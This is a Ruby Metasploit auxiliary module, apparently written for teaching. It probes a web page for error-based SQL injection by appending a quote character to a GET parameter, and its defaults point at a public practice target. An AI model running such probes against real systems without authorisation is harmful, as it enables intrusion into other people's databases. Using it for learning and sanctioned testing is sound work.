require 'csv'

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##



class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'Esra Demo SQLi',
                      'Description' => '
        This module demonstrates a basic SQL injection vulnerability exploit on a target web application.
        It is intended for beginner-level users to understand the principles of SQL injection attacks.
        The module sends a crafted SQL query via the URL and checks if the target is
        vulnerable by analyzing the server response. If the target is found to be vulnerable, the module
        confirms the exploit and reports the vulnerability.
      ',
                      'License' => MSF_LICENSE,
                      'Author' =>
                        [
                          'ESRA NUR SAYIM'
                        ],
                      'References' => [
                        ['CWE', '74'],
                        ['URL', 'https://medium.com/@naoumine']
                      ],
                      'DisclosureDate' => 'June 23 2024'
          ))

    # For ease of use during my tests, some values for the URL http://testphp.vulnweb.com/listproducts.php?cat=1 are pre-prepared by default.
    register_options(
      [
        Opt::RHOSTS('testphp.vulnweb.com'),
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'The base path to the SQLi demo', '/listproducts.php']),
        OptString.new('GET_VARS', [true,'Additional GET Parameters for web request','?cat=1']),
        OptString.new('SQL_PAYLOAD', [true,'SQL for web request',"'"])
    ]
    )
  end

  def check
    get_vars = {
      'param' => datastore['GET_VARS'],
      'payload' => datastore['SQL_PAYLOAD']
    }
    base_uri = datastore['TARGETURI']
    uri = "#{base_uri}#{get_vars['param']}#{get_vars['payload']}"
    res = send_request_cgi({
                       'method' => 'GET',
                       'uri' => uri
                     })
    if res && !res.body.include?("Error:")
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Vulnerable
    end
  end

  def run
    get_vars = {
      'param' => datastore['GET_VARS'],
      'payload' => datastore['SQL_PAYLOAD']
    }
    base_uri = datastore['TARGETURI']
    uri = "#{base_uri}#{get_vars['param']}#{get_vars['payload']}"
    send_request_cgi({
      'method' => 'GET',
      'uri' => uri
    })
    unless check == Exploit::CheckCode::Vulnerable
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end

    print_good(" Everything looks ok !\n The vulnerability you found appears to be Error based SQLi. \n You can use SQL Map ...")

  end
end